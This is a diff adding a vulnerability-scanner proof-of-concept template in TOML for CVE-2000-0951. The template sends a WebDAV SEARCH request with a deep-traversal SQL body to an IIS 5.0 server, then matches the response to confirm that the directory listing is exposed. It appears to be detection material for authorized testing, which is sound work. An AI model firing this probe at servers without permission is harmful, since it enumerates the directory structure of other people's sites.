@@ -1,0 +1,47 @@
+[info]
+author = "AVE"
+description = "检测 Microsoft IIS 5.0 索引目录信息泄露漏洞。通过发送 WebDAV SEARCH 请求，在启用了 Index Server 且目录设置了 Index 属性的 IIS 5.0 服务器上，可远程枚举 Web 根目录下的目录结构，导致敏感信息泄露。"
+id = "POC-AVE-2000-0693"
+name = "Microsoft IIS 5.0 Indexed Directory Disclosure PoC"
+severity = "medium"
+tags = [
+    "cve-2000-0951",
+    "iis",
+    "webdav",
+    "directory-disclosure",
+]
+vuln_id = [
+    "CVE-2000-0951",
+    "AVE-2000-0693",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "SEARCH"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<?xml version="1.0"?>\r
+<g:searchrequest xmlns:g="DAV:">\r
+<g:sql>SELECT "DAV:displayname" FROM SCOPE('Deep traversal of /')</g:sql>\r
+</g:searchrequest>"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+status = [207]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "DAV:",
+    "displayname",
+    "href",
+]
